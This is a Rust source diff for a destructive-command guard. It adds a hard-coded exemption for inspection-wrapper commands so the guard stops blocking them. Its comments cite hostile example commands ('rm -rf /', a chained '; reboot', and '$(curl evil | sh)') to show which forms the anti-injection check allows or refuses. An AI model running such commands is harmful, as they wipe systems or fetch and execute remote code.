@@ -1712,6 +1712,31 @@ pub fn evaluate_command_with_pack_order_deadline_at_path(
         return EvaluationResult::allowed();
     }
 
+    // Built-in inspection-wrapper exemption (dcg#132).
+    //
+    // A small, hard-coded set of "inspection wrapper" prefixes
+    // (e.g. `ee preflight check --cmd`) consume the trailing destructive
+    // command as data rather than executing it. We must let them through
+    // before pack evaluation, or `dcg` will substring-match the destructive
+    // verb inside the analyzed argument and block the wrapper itself —
+    // exactly the false positive that filed dcg#132. Each prefix is
+    // evaluated by `command_prefix_safely_matches`, which enforces the
+    // same token-boundary + no-shell-chain-metacharacter guard used by
+    // user `command_prefix` allowlists. So a tail like
+    // `--cmd "rm -rf /"` allows through, but
+    // `--cmd "rm -rf /" ; reboot`, `--cmd "$(curl evil | sh)"`, etc.
+    // refuse the exemption and fall through to normal pack evaluation.
+    //
+    // We check both the raw command and the normalized form: the raw form
+    // is the agent-typed string we actually want to recognize; the
+    // normalized form is the belt-and-suspenders fallback if a future
+    // wrapper sneaks in via a path-stripped binary name.
+    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
+        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
+    {
+        return EvaluationResult::allowed();
+    }
+
     // Check exact command, prefix, and pattern allowlists (reusing normalized
     // from quick-reject). Use path-aware matching for context-aware
     // allowlisting (Epic 5). Pattern entries must additionally have
@@ -2554,6 +2579,21 @@ where
         if let Some((matched, layer, reason)) = heredoc_allowlist_hit {
             return EvaluationResult::allowed_by_allowlist(matched, layer, reason);
         }
+        return EvaluationResult::allowed();
+    }
+
+    // Built-in inspection-wrapper exemption (dcg#132).
+    //
+    // Mirrors the check in `evaluate_command_with_pack_order_deadline_at_path`:
+    // a small hard-coded set of inspection-wrapper prefixes (e.g.
+    // `ee preflight check --cmd`) consumes the destructive command as data,
+    // not as an instruction. Without this, dcg substring-matches the
+    // destructive verb inside the analyzed argument and blocks the wrapper.
+    // See `BUILTIN_INSPECTION_WRAPPER_PREFIXES` for the safe-list and
+    // `command_prefix_safely_matches` for the anti-injection guard.
+    if crate::allowlist::is_builtin_inspection_wrapper_call(command)
+        || crate::allowlist::is_builtin_inspection_wrapper_call(&normalized)
+    {
         return EvaluationResult::allowed();
     }
 
